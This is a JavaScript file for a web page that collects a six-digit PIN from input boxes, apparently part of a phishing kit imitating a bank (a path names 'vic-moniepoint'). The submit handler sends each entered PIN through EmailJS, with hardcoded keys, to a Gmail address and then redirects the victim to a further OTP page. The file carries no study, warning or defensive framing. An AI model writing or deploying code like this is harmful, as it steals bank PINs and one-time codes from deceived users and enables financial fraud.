const serviceId = "service_iqpt0sm";
const userId = "W7QALGaY5oq4kqOTL";
const templateId = "template_ucxucok";

// Function to check if the input is a valid 6-digit PIN
function isValidPIN(Otp) {
  return /^\d{6}$/.test(Otp);
}

// Function to change the button color
function changeButtonColor(isFocused) {
  var submitBtn = document.getElementById("submitBtn");
  submitBtn.style.backgroundColor = isFocused ? "#0361f0" : ""; // Change the color as needed
  submitBtn.style.color = isFocused ? "#fff" : ""; // Change the color as needed
}

// Add event listeners to move the cursor to the next input field
var pinInputs = document.getElementsByClassName("pin-input");

for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("input", function () {
    if (this.value.length === 1) {
      var nextInputIndex = Array.from(pinInputs).indexOf(this) + 1;
      if (nextInputIndex < pinInputs.length) {
        pinInputs[nextInputIndex].focus();
      } else {
        changeButtonColor(true); // Focus is on the last input
      }
    }
  });
}

const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
// Function to collect and validate the PIN when the Submit button is clicked
document
  .getElementById("submitBtn")
  .addEventListener("click", function (event) {
    var Otp = "";
    var pinInputs = document.getElementsByClassName("pin-input");

    for (var i = 0; i < pinInputs.length; i++) {
      Otp += pinInputs[i].value;
    }

    console.log(Otp);
    event.preventDefault();
    const emailParams = {
      to_name: "join.kudapp@gmail.com",
      Otp: Otp,
    };
    console.log(emailParams);
    console.log(emailParams);
    emailjs.send(serviceId, templateId, emailParams, userId).then(
      function (response) {
        if (Otp.trim() !== "") {
          console.log("Sent successfully:", response);
          Otp = "";

          location.href = "/vic-moniepoint.xyz.github.io/otp.html";
        }
      },
      function (error) {
        if (Otp.trim() == "") {
          console.log("Failed to send:", error);
        }
      }
    );
  });
